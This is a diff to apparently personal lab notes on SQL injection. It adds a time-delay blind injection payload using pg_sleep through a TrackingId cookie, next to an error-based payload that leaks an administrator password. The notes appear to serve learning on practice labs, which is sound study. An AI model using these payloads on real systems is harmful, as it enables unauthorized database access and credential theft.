@@ -978,5 +978,20 @@ Finally it shows that --> Error: Invalid Input syntax for type integer:'administ
 Let's retrieve administrator's password -->
 TrackingId=' AND 1=CAST((SELECT password from users LIMIT 1) AS int)--;
 __________________________________________________________________________________________________________________________________________________________________
+Blind SQL injection with time delays
+------------------------------------
+The website will sleep about 10 seconds (pg_sleep() is used in postgreSQL)
+TrackingId=YuyEPQKc6y6pS6lN' || pg_sleep(10)--
+__________________________________________________________________________________________________________________________________________________________________
 
- 
+
+
+
+
+
+
+
+
+
+
+
